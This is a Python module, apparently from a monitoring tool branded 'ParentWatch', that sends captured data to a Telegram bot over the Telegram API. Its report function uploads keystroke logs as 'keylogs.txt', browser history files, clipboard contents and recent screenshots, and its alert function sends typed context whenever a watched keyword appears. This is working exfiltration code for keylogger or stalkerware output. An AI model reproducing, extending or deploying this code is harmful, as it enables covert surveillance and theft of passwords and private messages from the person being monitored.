# telegram_delivery.py — sends reports and alerts via Telegram bot

import urllib.request, urllib.parse, json, io
from datetime import datetime

TELEGRAM_API = "https://api.telegram.org/bot{token}/{method}"


def _post(token: str, method: str, data: dict) -> bool:
    url     = TELEGRAM_API.format(token=token, method=method)
    payload = json.dumps(data).encode("utf-8")
    req     = urllib.request.Request(url, data=payload,
                                     headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            result = json.loads(resp.read())
            return result.get("ok", False)
    except Exception:
        return False


def _post_file(token: str, method: str, fields: dict, file_field: str,
               filename: str, file_bytes: bytes, mime: str) -> bool:
    """Multipart upload for sending photos/documents."""
    import urllib.request
    boundary = b"----ParentWatchBoundary"
    body     = b""

    for key, val in fields.items():
        body += b"--" + boundary + b"\r\n"
        body += f'Content-Disposition: form-data; name="{key}"\r\n\r\n'.encode()
        body += str(val).encode() + b"\r\n"

    body += b"--" + boundary + b"\r\n"
    body += f'Content-Disposition: form-data; name="{file_field}"; filename="{filename}"\r\n'.encode()
    body += f"Content-Type: {mime}\r\n\r\n".encode()
    body += file_bytes + b"\r\n"
    body += b"--" + boundary + b"--\r\n"

    url = TELEGRAM_API.format(token=token, method=method)
    req = urllib.request.Request(url, data=body,
                                 headers={"Content-Type": f"multipart/form-data; boundary={boundary.decode()}"})
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            result = json.loads(resp.read())
            return result.get("ok", False)
    except Exception:
        return False


def send_message(token: str, chat_id: str, text: str) -> bool:
    """Send a plain text message. Splits if over 4096 chars."""
    max_len = 4000
    chunks  = [text[i:i+max_len] for i in range(0, len(text), max_len)]
    success = True
    for chunk in chunks:
        ok = _post(token, "sendMessage", {
            "chat_id":    chat_id,
            "text":       chunk,
            "parse_mode": "HTML"
        })
        if not ok:
            success = False
    return success


def send_photo(token: str, chat_id: str, png_bytes: bytes, caption: str = "") -> bool:
    """Send a screenshot as a photo."""
    return _post_file(
        token, "sendPhoto",
        {"chat_id": chat_id, "caption": caption},
        "photo", "screenshot.png", png_bytes, "image/png"
    )


def send_document(token: str, chat_id: str, text: str, filename: str = "report.txt") -> bool:
    """Send a large report as a text file attachment."""
    return _post_file(
        token, "sendDocument",
        {"chat_id": chat_id, "caption": f"ParentWatch Report — {datetime.now().strftime('%Y-%m-%d %H:%M')}"},
        "document", filename, text.encode("utf-8"), "text/plain"
    )


def send_report(token: str, chat_id: str, entries: list,
                screenshots: list = None) -> bool:
    """
    Send full hourly report.
    entries     = list of {ts, category, text}
    screenshots = list of (filename, png_bytes)
    """
    if not entries and not screenshots:
        return True

    # Build summary header
    cats = {}
    for e in entries:
        cats[e["category"]] = cats.get(e["category"], 0) + 1

    header = (
        f"<b>📊 ParentWatch Hourly Report</b>\n"
        f"<code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n\n"
    )
    for cat, count in cats.items():
        emoji = {"keylog": "⌨️", "browser": "🌐", "clipboard": "📋", "process": "🖥️"}.get(cat, "📁")
        header += f"{emoji} <b>{cat.upper()}</b>: {count} entries\n"

    send_message(token, chat_id, header)

    # Send browser history as document (can be long)
    browser_entries = [e for e in entries if e["category"] == "browser"]
    if browser_entries:
        text = "\n".join(f"[{e['ts']}] {e['text']}" for e in browser_entries[-100:])
        send_document(token, chat_id, text, "browser_history.txt")

    # Send keylogs as document
    key_entries = [e for e in entries if e["category"] == "keylog"]
    if key_entries:
        text = "\n".join(f"[{e['ts']}]\n{e['text']}" for e in key_entries[-50:])
        send_document(token, chat_id, text, "keylogs.txt")

    # Send clipboard entries inline
    clip_entries = [e for e in entries if e["category"] == "clipboard"]
    if clip_entries:
        msg = "<b>📋 CLIPBOARD</b>\n"
        for e in clip_entries[-20:]:
            msg += f"\n<code>[{e['ts']}]</code>\n{e['text'][:300]}\n"
        send_message(token, chat_id, msg)

    # Send up to 3 latest screenshots
    if screenshots:
        for fname, png_bytes in screenshots[-3:]:
            send_photo(token, chat_id, png_bytes,
                       caption=f"📸 {fname}")

    return True


def send_alert(token: str, chat_id: str, keyword: str, context: str) -> bool:
    """Send instant alert when a keyword is detected."""
    msg = (
        f"🚨 <b>KEYWORD ALERT</b>\n"
        f"Keyword: <code>{keyword}</code>\n"
        f"Context:\n<code>{context[:500]}</code>"
    )
    return send_message(token, chat_id, msg)
